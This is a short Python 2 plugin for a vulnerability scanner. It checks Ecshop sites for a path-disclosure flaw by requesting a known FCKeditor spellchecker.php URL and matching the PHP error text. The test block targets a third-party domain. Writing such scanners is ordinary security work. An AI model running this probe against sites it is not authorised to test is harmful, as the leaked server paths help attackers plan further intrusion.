#!/usr/bin/python2.7
#coding:utf-8

import requests
from dummy import *
import re

info = {
	'NAME':'Ecshop Path Disclosure',
	'AUTHOR':'wjk',
	'TIME':'20150325',
	'WEB':'',
	'DESCRIPTION':'Ecshop爆路径'
}
opts = {
	'url':'http://testasp.vulnweb.com',	#'target ip'
}
# opts = [
# 	['url','http://testasp.vulnweb.com','target url'],
# ]

def Assign(services):
	if services.has_key('url') and services.has_key('cms'):
		if services['cms'] == 'Ecshop':
			return True
	return False

def Audit(services):
	url = services['url'] +'/includes/fckeditor/editor/dialog/fck_spellerpages/spellerpages/server-scripts/spellchecker.php'
	try:
		ul = requests.get(url)
		qu=ul.text
		m = re.search('in <b>([^<]+)</b> on line <b>(\d+)</b>',qu)
		if m:
			security_hole(url)
	except:
		pass
# ----------------------------------------------------------------------------------------------------
#	untest yet
# ----------------------------------------------------------------------------------------------------
if __name__=='__main__':
	services = {'url':'http://www.eguan.cn'}
	pprint(Audit(services))
	pprint(services)
